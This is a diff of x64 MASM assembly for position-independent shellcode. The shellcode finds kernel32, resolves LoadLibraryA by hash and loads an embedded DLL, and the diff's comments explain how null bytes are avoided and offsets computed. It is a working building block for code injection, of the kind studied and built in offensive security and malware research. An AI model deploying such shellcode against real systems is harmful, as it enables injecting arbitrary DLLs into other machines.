@@ -12,37 +12,42 @@ public dllName
 .code
 
     shLoadLibraryA proc
-        sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes
-                                        ;// to align the stack from previous usage - the return RIP address pushed on the stack
-        and     rsp, 0fffffffffffffff0h ;// Align the stack to a multiple of 16 bytes
+        sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes.
+                                        ;// To align the stack from previous usage - the return RIP address pushed on the stack.
+        and     rsp, 0fffffffffffffff0h ;// Align the stack to a multiple of 16 bytes.
 
-        mov     rax, rsp                ;// 1. get the pointer to accessible memory in the stack, it will be referenced in step 3 below
-        call    $+4                     ;// 2. e8 ff ff ff ff  [after this call RIP will point to the last ff byte in this instruction]
-        db      030h                    ;// 3. ff 30 -> push qword ptr [rax]
-        pop     rax                     ;// 4. retore stack pointer after previos instruction
-        pop     rax                     ;// 5. pop the value that was pushed by call
-        sub     rax, 010h               ;// 6. rax is now holding the pointer to the beginning of the shLoadLibraryA code
+        mov     rax, rsp                ;// 1. get the pointer to accessible memory in the stack, it will be referenced in step 3 below.
+        call    $+4                     ;// 2. e8 ff ff ff ff  [after this call RIP will point to the last ff byte in this instruction].
+        db      030h                    ;// 3. ff 30 -> push qword ptr [rax].
+        pop     rax                     ;// 4. retore stack pointer after previos instruction.
+        pop     rax                     ;// 5. pop the value that was pushed by call.
+        sub     rax, 010h               ;// 6. rax is now holding the pointer to the beginning of the shLoadLibraryA code.
 
-        mov     r15, rax
+        mov     r15, rax                ;// Store the shLoadLibraryA base pointer in r15.
         mov     rcx, 0 - (getKernel32Base - shLoadLibraryA)
-        neg     rcx
-        add     rax, rcx
-        call    rax                     ;// call getKernel32Base, after the call rax = pKernel32Base
+        neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getKernel32Base symbol.
+        add     rax, rcx                ;// Make the address of the getKernel32Base symbol absolute by adding the base address to it.
+        call    rax                     ;// Call getKernel32Base, after the call rax = pKernel32Base.
 
-        mov     r10, r15
+        mov     r10, r15                ;// Get the shLoadLibraryA base pointer and store it in r10.
         mov     rcx, 0 - (getProcAddressAsm - shLoadLibraryA)
-        neg     rcx
-        add     r10, rcx
-        mov     rcx, rax                ;// rcx = pKernel32Base
-        mov     rdx, 07203081c80f2041h  ;// rdx = hash of "LoadLibraryA" string, obtained by shl13 hashing approach
-        call    r10                     ;// call getProcAddress, after the call rax = pLoadLibraryA
+        neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getProcAddressAsm symbol.
+        add     r10, rcx                ;// Make the address of the getProcAddressAsm symbol absolute by adding the base address to it.
+        mov     rcx, rax                ;// rcx = pKernel32Base, fist argument for the getProcAddressAsm function.
+        mov     rdx, 07203081c80f2041h  ;// rdx = hash of "LoadLibraryA" string, obtained by shl13 hashing approach. Second pararmeter for getProcAddressAsm.
+        call    r10                     ;// Call getProcAddressAsm, after the call rax = pLoadLibraryA, or zero.
 
-        mov     rcx, r15
-        mov     rdx, 0 - (dllName - shLoadLibraryA)
-        neg     rdx
-        and     dx, 0f0ffh
-        add     rcx, rdx                ;// pDllName
+      lSplit:
+        mov     rcx, r15                ;// Get the shLoadLibraryA base pointer and store it in rcx. It will be fixed up so that it will point to dllName symbol.
+        mov     rdx, 0 - (dllName - lSplit) ;// dllMain is more than 256 bytes away from the shLoadLibraryA, and this seem to be a problem for masm64, that's why
+        neg     rdx                     ;// the first shellcode's chunk size is calculated here, and stored in rdx.
+        mov     r12, 0 - (lSplit - shLoadLibraryA) ;// The second shellcode's chunk size is calculated here, and stored in r12.
+        neg     r12                     ;// r12 = The size of the second chunk of the shellcode.
+        add     rdx, r12                ;// rdx = The total size of the shellcode, from shLoadLibraryA symbol to dllName symbol.
+        add     rcx, rdx                ;// Make the address of the dllName symbol absolute by adding the base address to it.
         call    rax                     ;// call LoadLibraryA(dllName)
+
+        ;db "1234567890123456789012345678901234567890123456789012345678901234567890" ;// 70 bytes more can be used in shellcode
 
         add     rsp, 028h
         ret
